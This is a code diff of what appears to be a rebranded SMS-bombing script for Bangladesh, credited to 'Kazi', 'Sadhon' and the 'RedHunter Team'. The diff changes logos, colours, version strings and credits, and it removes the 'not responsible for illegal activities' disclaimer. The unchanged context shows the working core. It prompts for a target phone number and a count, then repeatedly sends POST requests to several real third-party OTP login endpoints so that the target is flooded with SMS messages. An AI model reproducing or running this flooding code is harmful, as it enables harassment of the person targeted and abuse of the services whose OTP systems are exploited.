@@ -48,23 +48,33 @@ purple="\033[0;45m"
 
 logo=(green+""" 
 
-              ░█─▄▀ ─█▀▀█ ░█▀▀▀█ ▀█▀ 
-              ░█▀▄─ ░█▄▄█ ─▄▄▄▀▀ ░█─ 
-              ░█─░█ ░█─░█ ░█▄▄▄█ ▄█▄
-
+  ██████  ▄▄▄      ▓█████▄  ██░ ██  ▒█████   ███▄    █ 
+▒██    ▒ ▒████▄    ▒██▀ ██▌▓██░ ██▒▒██▒  ██▒ ██ ▀█   █ 
+░ ▓██▄   ▒██  ▀█▄  ░██   █▌▒██▀▀██░▒██░  ██▒▓██  ▀█ ██▒
+  ▒   ██▒░██▄▄▄▄██ ░▓█▄   ▌░▓█ ░██ ▒██   ██░▓██▒  ▐▌██▒
+▒██████▒▒ ▓█   ▓██▒░▒████▓ ░▓█▒░██▓░ ████▓▒░▒██░   ▓██░
+▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░ ▒▒▓  ▒  ▒ ░░▒░▒░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
+░ ░▒  ░ ░  ▒   ▒▒ ░ ░ ▒  ▒  ▒ ░▒░ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
+░  ░  ░    ░   ▒    ░ ░  ░  ░  ░░ ░░ ░ ░ ▒     ░   ░ ░ 
+      ░        ░  ░   ░     ░  ░  ░    ░ ░           ░ 
+                    ░                                  
  """)
+ 
+              
+ 
                                                   
 
 
 
-line=(yellow+"======================================================")
-tversion=(cyan+"\t\t   Version : 1.0.1 ")
+line=(red+"=====================================================")
+
+tversion=(cyan+"\t\t   Version : 1.0.3 ")
 
 line2=("\t\t~~~~~~~~~~~~~~~~~~~~~~~~~~")
  
-dtls=(yellow+"\t\t Kazi The Brand ")
+dtls=(green+"\t\t It’s Kazi The Brand ")
 
-note=(cyan+"Note: I wont be responsible fo any illigal activites. >> This tool is for use in Bangladesh only. Use our Global version for worldwide use.")
+note=(cyan+"Hello Bangladesh,Welcome to My Update Tool.Thanks for use my tool")
 
 print(logo)
 
@@ -86,8 +96,8 @@ print(line)
 
 print(' ')
 
-number=str(input(green+"[➙] Enter Your Number : "))
-amount=int(input(yellow+"[➙] Enter The Amount : "))
+number=str(input(red+"[➙] Enter Your Number : "))
+amount=int(input(red+"[➙] Enter The Amount : "))
 
 url1 = "https://ss.binge.buzz/otp/send/login"
 
@@ -134,7 +144,7 @@ for i in range (amount):
 	resp4 = requests.post(url4, headers=headers4,data=data4)
 	resp5 = requests.post(url5, headers=headers5, data=data5)
 	resp = requests.post(url6, headers=headers6, data=data6)	
-	print(str(i+1)+green+'.	➙KAZI SMS SENT 💥✅')
+	print(str(i+1)+magenta+'.	➙SMS SENT SUCCESSFUL BY SADHON 💣')
 	
 print('					')
 print(cyan+'\t\tThanks For Using RedBomber Bangladesh By Redwiat - RedHunter Team')
